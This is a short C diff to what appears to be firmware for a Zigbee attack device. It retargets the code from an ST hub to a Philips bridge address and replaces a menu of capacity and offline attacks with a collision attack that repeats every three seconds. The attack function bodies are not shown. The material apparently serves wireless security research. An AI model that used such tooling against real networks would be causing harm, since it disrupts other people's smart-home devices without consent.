@@ -43,10 +43,10 @@ int main(void)
 	/** TEST FIELD **/
 	// Here we let dst_device = hub, src_device = sensor to test our API
 	
-	hub_addr.pan = 0x2ca2;
-	hub_addr.epan = ST_EPAN_ID;
-	hub_addr.short_addr = 0x0000;
-	hub_addr.long_addr = ST_HUB_MAC_ADDR;
+	hub_addr.pan = 0x7051;
+	hub_addr.epan = PHILIPS_EPAN_ID;
+	hub_addr.short_addr = 0x0001;
+	hub_addr.long_addr = PHILIPS_BRIDGE_MAC_ADDR;
 	hub_addr.device_type = 0;
 	hub_addr.polling_type = 0;
 	hub_addr.coordinator_flag = 1;
@@ -78,26 +78,9 @@ int main(void)
 		{
 			// Fill up ZED list
 			led(1);
-			capacity_attack(&hub_addr, 0x15000000, 2);
-			attack_no = 0xff;
+			collision_attack(&hub_addr, 0x15000000, 2);
+			_delay_ms(3000);
 			led(0);
-		}
-		else if (attack_no == 2)
-		{
-			offline_attack(&bulb_addr, &victim_addr, 0x24000000);
-			attack_no = 0xff;
-		}
-		else if (attack_no == 3)
-		{
-			sleep_mode();
-		}
-		else if (attack_no == 4)
-		{
-			attack_no = 0xff;
-		}
-		else
-		{
-			sleep_mode();
 		}
 		
 	}
